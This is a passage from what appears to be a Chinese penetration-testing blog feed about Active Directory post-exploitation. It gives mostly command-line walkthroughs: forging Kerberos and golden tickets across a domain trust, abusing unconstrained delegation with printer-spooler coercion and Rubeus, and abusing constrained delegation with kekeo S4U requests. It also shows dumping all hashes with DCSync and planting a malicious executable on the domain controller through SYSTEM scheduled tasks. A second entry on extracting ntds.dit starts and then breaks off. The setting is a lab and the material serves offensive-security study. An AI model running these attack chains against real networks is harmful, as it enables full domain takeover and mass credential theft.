</p><p>5.上传asktgs.exe和kirbikator.exe工具，asktgs.exe伪造票据，kirbikator.exe注入票据</p><p><img src="/img/image-20231026113720225.png" alt="image-20231026113720225"> </p><p>6.创建CIFS服务的票据进行复制文件的操作</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell asktgs<span class="hljs-selector-class">.exe</span> administrator<span class="hljs-selector-class">.kirbi</span> CIFS/DC<span class="hljs-selector-class">.hack</span>.com<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026113818554.png" alt="image-20231026113818554"> </p><p><img src="/img/image-20231026113825582.png" alt="image-20231026113825582"> </p><p>7.将票据注入内存</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell kirbikator<span class="hljs-selector-class">.exe</span> lsa CIFS<span class="hljs-selector-class">.DC</span><span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.com</span>.kirbi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026113911603.png" alt="image-20231026113911603"> </p><p>8.访问域控</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\dc.hack.com\c$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026113932373.png" alt="image-20231026113932373"> </p><p>9.复制恶意文件,如果复制失败，请注入host服务票据。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> artifact.<span class="hljs-keyword">exe</span> \\dc.hack.<span class="hljs-keyword">com</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026114021660.png" alt="image-20231026114021660"> </p><p>10.伪造host服务，进行创建计划任务</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell asktgs<span class="hljs-selector-class">.exe</span> administrator<span class="hljs-selector-class">.kirbi</span> host/DC<span class="hljs-selector-class">.hack</span>.com<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026114044469.png" alt="image-20231026114044469"> </p><p>11.注入内存</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell kirbikator<span class="hljs-selector-class">.exe</span> lsa host<span class="hljs-selector-class">.DC</span><span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.com</span>.kirbi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026114118756.png" alt="image-20231026114118756"> </p><p>12.重新复制</p><p><img src="/img/image-20231026114218620.png" alt="image-20231026114218620"> </p><p>13.创建计划任务(需要重新注入host票据)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\artifact.exe /ru system /f<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026114459649.png" alt="image-20231026114459649"></p><p>14.执行计划任务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>s dc.hack.com <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;test&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026114535439.png" alt="image-20231026114535439"> </p><ol start="15"><li>dc上线：</li></ol><p><img src="/img/image-20231026114559758.png" alt="image-20231026114559758"> </p><h2 id="4-利用krbtgt值获取目标域"><a href="#4-利用krbtgt值获取目标域" class="headerlink" title="4.利用krbtgt值获取目标域"></a>4.利用krbtgt值获取目标域</h2><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><table><thead><tr><th>IP</th><th>所属域</th><th>域中地位</th><th>机器名</th><th>当前登录用户</th></tr></thead><tbody><tr><td>10.210.100.10</td><td>hack.com</td><td>根域的域控</td><td>DC</td><td>hack\administrator</td></tr><tr><td>10.210.100.150</td><td>abc.hack.com</td><td>子域域控</td><td>DC2</td><td>abc\administrator</td></tr><tr><td>10.210.100.144</td><td>abc.hack.com</td><td>子域中的机器</td><td>PC-2008-2</td><td>abc\liwei</td></tr></tbody></table><p>当前已经控制abc.hack.com域，其中包括 DC2机器和PC-2008-2机器</p><h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>清除票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">shell klist purge<br>mimikatz kerberos::purge<br></code></pre></td></tr></table></figure><p>获取Krbtgt散列</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsadump::lsa <span class="hljs-regexp">/patch /u</span>ser:krbtgt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026142607004.png" alt="image-20231026142607004"> </p><p>66664f8ca84afb2d6fa9947469140fc7</p><p>获取关键信息</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">lsadump::trust /patch<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026142645127.png" alt="image-20231026142645127"> </p><p>子域sid：S-1-5-21-3991110149-857536787-685120577</p><p>父域sid：S-1-5-21-2431442348-1717482385-2017137259</p><p>构造并注入黄金票据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-<span class="hljs-number">519</span> /krbtgt:krbtgt散列 /ptt<br><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:abc.hack.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3991110149</span>-<span class="hljs-number">857536787</span>-<span class="hljs-number">685120577</span> /sids:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2431442348</span>-<span class="hljs-number">1717482385</span>-<span class="hljs-number">2017137259</span>-<span class="hljs-number">519</span> /krbtgt:<span class="hljs-number">66664</span>f8ca84afb2d6fa9947469140fc7 /ptt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026143120911.png" alt="image-20231026143120911"></p><p>访问目标域</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\dc.hack.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026143132818.png" alt="image-20231026143132818"> </p><p>复制恶意文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">copy</span> <span class="hljs-number">1</span>.<span class="hljs-keyword">exe</span> \\dc.hack.<span class="hljs-keyword">com</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure><p>执行计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\1.exe /ru system /f<br></code></pre></td></tr></table></figure><p>启动计划任务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>s dc.hack.com <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;test&quot;</span><br></code></pre></td></tr></table></figure><p>上线</p><h2 id="5-委派攻击的概述"><a href="#5-委派攻击的概述" class="headerlink" title="5.委派攻击的概述"></a>5.委派攻击的概述</h2><h3 id="委派是什么"><a href="#委派是什么" class="headerlink" title="委派是什么"></a>委派是什么</h3><p>先看一下kerberos协议</p><p><img src="/img/image-20231026143603868.png" alt="image-20231026143603868"></p><p>我们要去买票，但是自己又不想去，我们就可以委托中间商，给我们买票，这个就是委派</p><p><img src="/img/image-20231026143634354.png" alt="image-20231026143634354"></p><p><strong>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。</strong></p><p>委派是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种：</p><p>1、非约束性委派：不做任何限制，可以访问任何资源 例如 文件系统 oa系统  域控等</p><p>2、约束性委派：限制访问某些指定的资源</p><p>3、基于资源的约束性委派</p><h3 id="委派攻击的工作场景"><a href="#委派攻击的工作场景" class="headerlink" title="委派攻击的工作场景"></a>委派攻击的工作场景</h3><p>一个域内用户访问WEB服务，但是一些资源在文件服务上，这个时候就需要委派</p><p><img src="/img/image-20231026144321857.png" alt="image-20231026144321857"></p><h3 id="怎么设置委派"><a href="#怎么设置委派" class="headerlink" title="怎么设置委派"></a>怎么设置委派</h3><p>在域内只有<strong>主机账号</strong>（整个主机）和<strong>服务账号</strong>（例如主机上的web服务）才有委派属性</p><p><strong>主机账号</strong>：活动目录中的computers组内的计算机，也被称为机器账号</p><p><img src="/img/image-20231026145058584.png" alt="image-20231026145058584"></p><p><strong>服务账号</strong>：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> test123 <span class="hljs-keyword">Admin</span>@<span class="hljs-number">123</span> /<span class="hljs-keyword">add</span> /<span class="hljs-keyword">domain</span> 创建一个普通用户<br>setspn -U -A priv/test test123 注册为服务账号<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026145731798.png" alt="image-20231026145731798"> </p><p>开启委派如图</p><p><img src="/img/image-20231026145744792.png" alt="image-20231026145744792"></p><h2 id="6-非约束委派攻击"><a href="#6-非约束委派攻击" class="headerlink" title="6.非约束委派攻击"></a>6.非约束委派攻击</h2><h3 id="非约束委派使用场景"><a href="#非约束委派使用场景" class="headerlink" title="非约束委派使用场景"></a>非约束委派使用场景</h3><p>从使用的角度：用户张三访问一台机器A，于是向KDC发起认证，KDC会检查A的机器账号的属性，如果是非约束委派的话，会把用户的TGT放在ST票据中并一起发送给A,这样A在验证ST票据的同时也获取到了用户的TGT，并把TGT储存在自己的lsass进程中以备下次重用，从而A就可以使用这个TGT，来模拟这个张三访问任何服务。</p><p><img src="/img/image-20231026150551796.png" alt="image-20231026150551796"></p><p>从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境，或者结合打印机漏洞让域管用户强制回连以缓存TGT</p><p>一个域内用户访问WEB服务，但是一些资源在文件服务上，这个时候就需要委派，需要web系统代表用户A去访问文件服务的资源</p><p><img src="/img/image-20231026150752355.png" alt="image-20231026150752355"></p><h3 id="非约束委派的漏洞"><a href="#非约束委派的漏洞" class="headerlink" title="非约束委派的漏洞"></a>非约束委派的漏洞</h3><p><img src="/img/image-20231026151227151.png" alt="image-20231026151227151"></p><p>如果是域管访问web系统，我们就可以通过web系统伪造域管的身份登录域控</p><h3 id="利用非约束委派域控主动访问控制域"><a href="#利用非约束委派域控主动访问控制域" class="headerlink" title="利用非约束委派域控主动访问控制域"></a>利用非约束委派域控主动访问控制域</h3><p>实验环境</p><table><thead><tr><th>机器位置</th><th>IP</th><th>机器名</th><th>机器登录用户</th><th>所属域</th><th>委派配置</th></tr></thead><tbody><tr><td>域控</td><td>10.210.100.10</td><td>DC</td><td>hack\administrator</td><td>hack.com</td><td>域控</td></tr><tr><td>域内机器</td><td>10.210.100.40</td><td>PC-WEB</td><td>hack\r1cky</td><td>hack.com</td><td>配置了非约束委派</td></tr></tbody></table><p>实验前提：控制了域内的一台机器pc-web，并且该机器的服务账号配置了非约束委派，如下： </p><p><img src="/img/image-20231026154603409.png" alt="image-20231026154603409"> </p><p>1、使用Adfind查询域内非约束委派机器账号</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=hack,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026154958716.png" alt="image-20231026154958716"></p><p>查询具有委派的服务账号</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=hack,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br></code></pre></td></tr></table></figure><p>2、我们先去访问域控，是不能访问的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\dc.hack.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p>3、这个时候如果<strong>域管访问了pc-web机器</strong>我们的内存中就会有域管的TGT，就可以访问任意机器了，在与域控上执行访问PC-WEB(在域控上执行)</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-title class_">PC</span>-<span class="hljs-title class_">WEB</span>.<span class="hljs-title class_">HACK</span>.<span class="hljs-title class_">COM</span> /<span class="hljs-symbol">user:</span>hack\administrator <span class="hljs-title class_">Admin</span><span class="hljs-variable">@123</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026155119975.png" alt="image-20231026155119975"> </p><p>4、去pc-web导出内存中的票据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">sekurlsa::tickets /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026155241351.png" alt="image-20231026155241351"> </p><p>导出失败  需要提权</p><p><img src="/img/image-20231026155300222.png" alt="image-20231026155300222"> </p><p><img src="/img/image-20231026155537670.png" alt="image-20231026155537670"> </p><p>5、进行票据传递就可以获取域控的权限了</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">mimikatz kerberos<span class="hljs-number">::</span>ptt [<span class="hljs-number">0;9c453</span>]-<span class="hljs-number">2</span>-<span class="hljs-number">0-60a10000</span>-Administrator@krbtgt-HACK.COM.kirbi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026155706178.png" alt="image-20231026155706178"></p><p>6、访问域控</p><p><img src="/img/image-20231026155724917.png" alt="image-20231026155724917"> </p><p>7、使用计划任务，服务，或者无文件的powershell上线</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> copy artifact.exe \\dc.hack.com\C$</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\artifact.exe /ru</span><br>system /f<br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s dc.hack.com /i /tn <span class="hljs-string">&quot;test&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026155917312.png" alt="image-20231026155917312"> </p><h3 id="利用非约束委派域控被动访问控制域控"><a href="#利用非约束委派域控被动访问控制域控" class="headerlink" title="利用非约束委派域控被动访问控制域控"></a>利用非约束委派域控被动访问控制域控</h3><table><thead><tr><th>机器位置</th><th>IP</th><th>机器名</th><th>机器登录用户</th><th>所属域</th><th>委派配置</th></tr></thead><tbody><tr><td>域控</td><td>10.210.100.10</td><td>DC</td><td>hack\administrator</td><td>hack.com</td><td>域控</td></tr><tr><td>域内机器</td><td>10.210.100.40</td><td>2012-2(OA)</td><td>administrator</td><td>hack.com</td><td>配置了非约束委派</td></tr></tbody></table><p>实验前提：控制了域内的一台机器OA，并且该机器的服务账号配置了非约束委派，如下：</p><p>一般域管不会主动访问我们，我们可以利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p><p>非约束性委派主机结合 Spooler 打印机服务漏洞，<strong>让域控机器DC强制访问已控的具有本地管理员权限的非约束性委派机器</strong> OA ，从而拿到域管理员的 TGT，进而接管域控。（2008机器可能复现不了，因为版本的问题）</p><p>进行实验之前一定要把所有的防火墙关闭</p><p>1、首先利用Rubeus在 OA 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器DC的登录信息</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:DC$<br></code></pre></td></tr></table></figure><p>这里执行失败（下面为他人成功示例）</p><p><img src="/img/image-20231026162055410.png" alt="image-20231026162055410"> </p><p><img src="/img/image-20231026162115838.png" alt="image-20231026162115838"></p><p>再利用SpoolSample强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SpoolSample</span>.</span></span>exe DC OA<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026162234292.png" alt="image-20231026162234292"></p><p>Rubeus监听到票据</p><p><img src="/img/image-20231026162243719.png" alt="image-20231026162243719"></p><p>Rubeus导入票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe ptt /ticket:票据<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026162307198.png" alt="image-20231026162307198"></p><p>获取域内用户的hash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsadump::dcsync <span class="hljs-regexp">/all /</span>csv<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026162327496.png" alt="image-20231026162327496"></p><p>如果当前的用户是管理员就可以使用PTH攻击，如果是普通的域用户就使用黄金票据</p><p><img src="/img/image-20231026162338329.png" alt="image-20231026162338329"></p><p>使用计划任务，服务，或者无文件的powershell上线</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">copy</span><span class="language-bash"> 123.exe \\dc.hack.com\C$</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\123.exe /ru</span><br>system /f<br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s dc.hack.com /i /tn <span class="hljs-string">&quot;test&quot;</span></span><br></code></pre></td></tr></table></figure><h2 id="7-约束性委派攻击"><a href="#7-约束性委派攻击" class="headerlink" title="7.约束性委派攻击"></a>7.约束性委派攻击</h2><h3 id="约束性委派场景"><a href="#约束性委派场景" class="headerlink" title="约束性委派场景"></a>约束性委派场景</h3><p>当这个用户不在域内，他在出差，不能使用kerberos去认证，只能使用其他协议认证web系统，那同样WEB系统也需要访问文件服务的资源，这个时候如何认证呢？</p><p><img src="/img/image-20231026165118008.png" alt="image-20231026165118008"></p><p>Widnows Server2003之后微软引入了非约束委派。由于非约束委派的不安全性或者场景受限（配置了非约束委派的机器在 LSASS 中缓存了用户的TGT票据可模拟用户去访问域中任意服务），微软于2007年为 Kerberos 协议进行扩展引入S4U(service for user)协议，该协议分为两个子协议</p><p>这两个扩展都允许服务代表用户从KDC请求票证。</p><p>约束委派限制了S4U2proxy协议的请求范围，使得<strong>配置了委派属性的服务只能模拟用户身份访问特定的其他服务</strong></p><p>1、S4u2self（Service for User to Self） </p><p>2、S4U2proxy（Service for User to Proxy）</p><p>这两个扩展都允许服务代表用户从KDC请求票证</p><p>约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务</p><p><img src="/img/image-20231026165502523.png" alt="image-20231026165502523"></p><p>存在的问题</p><p>1、服务账号B可以代表A申请访问B的票据，那么可不可以代表域管申请域管访问B的票据呢？在这个过程中，不需要域管参与，服务B自身就可以完成 </p><p>2、服务账号B可以代表A申请访问C的票据，那么可不可以代表域管申请域管访问C的票据呢？在这个过程中，不需要域管参与，服务B自身就可以完成</p><h3 id="约束性委派攻击流程"><a href="#约束性委派攻击流程" class="headerlink" title="约束性委派攻击流程"></a>约束性委派攻击流程</h3><p>用户（A）访问WEB系统（B）,B代表A去向KDC申请访问B的TGT和ST1(使用S4u2self),用户A拿到了ST1就可以访问B了，如果在B上配置了约束性委派（A到C的约束委派），则B能够使用S4U2Proxy协议将用 户发给自己的可转发的ST1票据以用户的身份发给KDC,KDC返回B一个访问C的票据ST2，这样B就可以以用户的身份访问C</p><p><img src="/img/image-20231026173140970.png" alt="image-20231026173140970"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>.通过NTLM或者其他认证<br><span class="hljs-number">2</span><span class="hljs-selector-class">.B</span>代表<span class="hljs-selector-tag">A</span>申请<span class="hljs-selector-tag">A</span>访问<span class="hljs-selector-tag">B</span>的票据(TGT和ST1)<br><span class="hljs-number">3</span><span class="hljs-selector-class">.KDC</span>返回用户的TGT和ST1票据给<span class="hljs-selector-tag">B</span><br><span class="hljs-number">4</span><span class="hljs-selector-class">.B</span>把ST1票据给<span class="hljs-selector-tag">A</span><br><span class="hljs-number">5</span><span class="hljs-selector-class">.A</span>用ST1去访问<span class="hljs-selector-tag">B</span><br><span class="hljs-number">6</span><span class="hljs-selector-class">.B</span>拿着<span class="hljs-selector-tag">A</span>的ST1作为证据，去申请访问C的ST2<br><span class="hljs-number">7</span><span class="hljs-selector-class">.B</span>用ST2票据访问C<br></code></pre></td></tr></table></figure><p>存在的问题是什么呢？ </p><p>B会获取A的TGT,只要能伪造A的TGT,就可以用TGT申请ST1票据（伪造管理员申请ST1票据）</p><h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p><img src="/img/image-20231026173807878.png" alt="image-20231026173807878"></p><p>实验前提：我们已经控制了ZS的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器用户的HASH值</p><p>1、查询约束性委派的机器和用户</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">查询约束委派机器账户<br>AdFind<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=hack,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br>查询约束委派服务账户<br>AdFind<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=hack,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026173852063.png" alt="image-20231026173852063"></p><p>查询到PC-ZS电脑配置了约束委派，委派的目标是DC的CIFS服务 </p><p>2、使用mimikatz获取机器账户NTLM Hash</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026173915464.png" alt="image-20231026173915464"></p><p>3、使用kekeo申请配置了约束委派机器账户PC-ZS$的TGT</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kekeo</span> <span class="hljs-string">&quot;tgt::ask /user:PC-ZS$ /NTLM:bd41aace231471169d848817a2c46178 /domain:hack.com&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026173937509.png" alt="image-20231026173937509"></p><p>利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kekeo</span> <span class="hljs-string">&quot;tgs::s4u /tgt:TGT_PC-ZS$<span class="hljs-variable">@HACK</span>.COM_krbtgt~hack.com<span class="hljs-variable">@HACK</span>.COM.kirbi /user:Administrator<span class="hljs-variable">@hack</span>.com /service:cifs/dc.hack.com&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026174002747.png" alt="image-20231026174002747"></p><p>mimkatz注入</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz kerberos::ptt<br><span class="hljs-title class_">TGS_Administrator</span><span class="hljs-variable">@hack</span>.com<span class="hljs-variable">@HACK</span>.<span class="hljs-title class_">COM_cifs</span>~dc.hack.com<span class="hljs-variable">@HACK</span>.<span class="hljs-title class_">COM</span>.kirbi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026174025033.png" alt="image-20231026174025033"></p><p>访问域控</p><p><img src="/img/image-20231026174037119.png" alt="image-20231026174037119"></p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网-域控安全</title>
    <link href="/2023/11/03/%E5%86%85%E7%BD%91-%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    <url>/2023/11/03/%E5%86%85%E7%BD%91-%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="域控安全"><a href="#域控安全" class="headerlink" title="域控安全"></a>域控安全</h1><h2 id="ntds-dit文件介绍"><a href="#ntds-dit文件介绍" class="headerlink" title="ntds.dit文件介绍"></a>ntds.dit文件介绍</h2><p>ntds.dit为ad的数据库，<strong>内容有域用户、域组、用户hash等信息</strong>，<strong>域控上的ntds.dit只有可以登录到域控的用户（如域管用户、DC本地管理员用户）可以访问</strong>。ntds.dit包括三个主要表：数据表、链接表、 sd表。所以只要在域渗透中能够获取到ntds.dit就可以获取到所有域用户的用户名和对应的hash，它和 SAM文件一样，被windows系统锁死</p><h3 id="Ntds-dit位置"><a href="#Ntds-dit位置" class="headerlink" title="Ntds.dit位置"></a>Ntds.dit位置</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\Windows\NTDS<br></code></pre></td></tr></table></figure><p>无法直接读取</p><p><img src="/img/image-20231024143739958.png" alt="image-20231024143739958"> </p><h2 id="1-多种方式提取和移动ntds-dit文件"><a href="#1-多种方式提取和移动ntds-dit文件" class="headerlink" title="1.多种方式提取和移动ntds.dit文件"></a>1.多种方式提取和移动ntds.dit文件</h2><h3 id="ntdsutils-exe提取ntds-dit"><a href="#ntdsutils-exe提取ntds-dit" class="headerlink" title="ntdsutils.exe提取ntds.dit"></a>ntdsutils.exe提取ntds.dit</h3><p>ntdsutils.exe 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutils.exe 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区等，该工具默认安装在域控服务器上，可 以在域控制器上直接操作，支持windows server 2003、2008、2012。提取过程分为3步：</p><p>第一步：创建快照</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ntdsutil.exe <span class="hljs-keyword">snapshot</span> &quot;activate instance ntds&quot; <span class="hljs-keyword">create</span> q q<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024144143033.png" alt="image-20231024144143033"></p><p>可以看到快照的uid是 